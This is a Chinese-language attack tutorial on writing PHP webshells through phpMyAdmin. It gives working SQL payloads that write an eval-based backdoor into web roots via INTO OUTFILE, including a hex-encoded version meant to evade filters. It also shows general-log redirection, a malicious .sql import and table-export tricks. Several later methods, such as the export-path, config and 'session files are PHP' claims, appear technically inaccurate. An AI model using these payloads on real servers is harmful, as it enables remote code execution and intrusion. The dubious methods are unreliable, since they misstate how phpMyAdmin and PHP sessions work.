### phpMyAdmin 写 Shell 的方法

**1. 利用 `SELECT ... INTO OUTFILE` 或 `DUMPFILE`**

这是最常用、最经典的 phpMyAdmin 写 Shell 方法。`INTO OUTFILE` 和 `DUMPFILE` 语句都允许将查询结果写入文件

- **前提条件：**

  - 数据库用户具有 `FILE` 权限
  - 目标服务器上的 MySQL 用户可以对网站目录有写入权限
  - `secure_file_priv` 参数没有被设置或被设置为可以写入的目录。如果这个参数被设置为 `NULL`，则该方法会失效

- **操作步骤：**

  1. 登录 phpMyAdmin
  2. 进入 SQL 查询页面
  3. 构造并执行 SQL 语句。通常，我们会写入一个简单的 PHP WebShell

  ```sql
  SELECT '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
  ```

  或者使用十六进制编码来绕过可能的过滤：

  ```sql
  SELECT 0x3c3f70687020406576616c28245f504f53545b22636d64225d293b3f3e INTO OUTFILE '/var/www/html/shell.php';
  ```

- **优点：** 简单直接，成功率高

- **缺点：** 依赖于 MySQL 用户的 `FILE` 权限和服务器配置

**2. 利用日志文件写 Shell**

当 `INTO OUTFILE` 无法使用时，日志文件是一个很好的替代方案。如果 MySQL 的**通用查询日志**（general log）或**慢查询日志**（slow query log）是开启的，并且日志文件可写，我们就可以利用这个特性来写入 WebShell

- **操作步骤：**

  1. **查看日志状态：** 登录 phpMyAdmin，执行以下 SQL 语句来查看通用日志的开启状态和日志路径

     ```sql
     SHOW VARIABLES LIKE 'general_log';
     SHOW VARIABLES LIKE 'general_log_file';
     ```

  2. **设置日志路径：** 将日志路径设置为网站可访问的目录，例如 `/var/www/html/shell.php`

     ```sql
     SET GLOBAL general_log_file = '/var/www/html/shell.php';
     ```

  3. **开启日志：** 开启通用查询日志

     ```sql
     SET GLOBAL general_log = 'ON';
     ```

  4. **执行恶意查询：** 构造一个查询，其中包含我们的 WebShell 代码

     ```sql
     SELECT '<?php @eval($_POST["cmd"]);?>';
     ```

     这条查询语句和它的结果会被写入到 `shell.php` 文件中

  5. **关闭日志（可选）：** 为了避免日志文件过大，可以再次关闭它

     ```sql
     SET GLOBAL general_log = 'OFF';
     ```

- **优点：** 绕过了 `secure_file_priv` 的限制，只要有 `SUPER` 权限即可

- **缺点：** 需要 MySQL 用户拥有 `SUPER` 权限，并且日志功能必须是开启的，或者我们有权限开启它

**3. 利用 `phpMyAdmin` 导入功能**

这是最常用且最有效的方法之一。`phpMyAdmin` 的导入功能允许用户上传一个 `.sql` 文件，并执行其中的 SQL 语句。如果文件内容可控，我们就可以利用这个功能来写入 WebShell

- **前提条件：**

  - 拥有一个可上传的 `.sql` 文件
  - 具有导入数据库的权限

- **操作步骤：**

  1. 创建一个 `.sql` 文件，文件内容为写入 WebShell 的 SQL 语句。例如，使用 `SELECT ... INTO OUTFILE`

     ```sql
     -- shell.sql
     SELECT '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
     ```

  2. 登录 `phpMyAdmin`，选择一个数据库

  3. 点击导航栏的“导入”选项卡

  4. 选择你创建的 `shell.sql` 文件，然后点击“执行”按钮

  5. `phpMyAdmin` 会执行 `shell.sql` 中的 SQL 语句，从而在服务器上写入 WebShell

**4. 利用 `phpMyAdmin` 文件导出功能**

这个方法与导入功能相反，它利用的是导出功能。在某些配置下，`phpMyAdmin` 允许将数据库或表中的数据导出为文件。

- **前提条件：**

  - 数据库用户具有 `FILE` 权限
  - `secure_file_priv` 参数没有限制
  - 需要创建一个包含 WebShell 代码的表

- **操作步骤：**

  1. 登录 `phpMyAdmin`，进入一个数据库，然后点击“SQL”选项卡

  2. 创建一个新的表，将 WebShell 代码作为一行数据插入进去

     ```sql
     CREATE TABLE `shell_table` (`data` TEXT NOT NULL);
     INSERT INTO `shell_table` (`data`) VALUES ('<?php @eval($_POST["cmd"]);?>');
     ```

  3. 点击“导出”选项卡，选择刚才创建的 `shell_table` 表

  4. 在导出选项中，选择导出为 `.sql` 文件，并勾选“导出为独立文件”

  5. 修改导出路径，将其指向网站可访问的目录，例如 `/var/www/html/shell.php`

  6. 点击“执行”，`phpMyAdmin` 就会将包含 WebShell 代码的表数据导出为 `shell.php` 文件

**5. 利用 `phpMyAdmin` `PHPMYADMIN` 配置文件**

这是一种更高级、更具技巧性的方法，它利用了 `phpMyAdmin` 自身的配置文件。在某些旧版本或配置不当的环境中，`phpMyAdmin` 允许通过后台界面修改一些配置

- **前提条件：**
  - `phpMyAdmin` 版本存在相关漏洞，例如 `PHPMYADMIN` 4.0.0-4.0.5 之间的版本
  - 拥有足够的权限来修改配置
- **操作步骤：**
  1. 登录 `phpMyAdmin`，进入“设置”页面
  2. 寻找允许修改文件路径或文件名的选项，例如“导出文件路径”或“临时目录”
  3. 将这些路径修改为包含 WebShell 代码的文件名，例如 `shell.php`
  4. 在某个地方输入 WebShell 代码，当 `phpMyAdmin` 尝试使用这个修改后的路径时，就会将 WebShell 代码写入文件

**6. 利用 `phpMyAdmin` `SESSION` 文件写 `SHELL`**

这个方法是利用 `phpMyAdmin` 处理会话文件时的漏洞

- **前提条件：**
  - `phpMyAdmin` 的会话文件可控
  - 具有足够的权限
- **操作步骤：**
  1. 在登录 `phpMyAdmin` 的过程中，构造一个恶意的 `SQL` 查询，其中包含 WebShell 代码
  2. 由于 `phpMyAdmin` 会将会话信息保存在服务器的 `SESSION` 文件中，如果其没有对输入进行严格过滤，那么恶意代码可能会被写入 `SESSION` 文件
  3. 找到 `SESSION` 文件的路径，然后访问该文件。由于会话文件是 PHP 文件，其中的恶意代码会被执行，从而获得 WebShell